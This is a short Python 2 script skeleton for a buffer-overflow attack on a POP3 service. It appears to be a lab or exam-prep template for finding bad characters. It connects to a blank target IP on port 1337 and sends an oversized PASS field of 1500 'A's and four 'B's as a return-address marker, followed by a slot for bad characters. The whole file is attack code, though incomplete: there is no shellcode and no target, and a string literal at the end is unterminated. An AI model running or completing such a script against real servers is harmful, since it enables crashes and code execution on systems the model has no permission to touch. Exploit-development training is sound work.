#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ip=''
port=1337
badchars = ""
#insert bad charactiers above

buffer="A"*1500 + "B"*4 + badchars
#

try:
    print "\nSending  buffer..."
    s.connect((ip,port))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    s.close()
    print "\nDone!"
except:
    print "Could not connect to POP3!
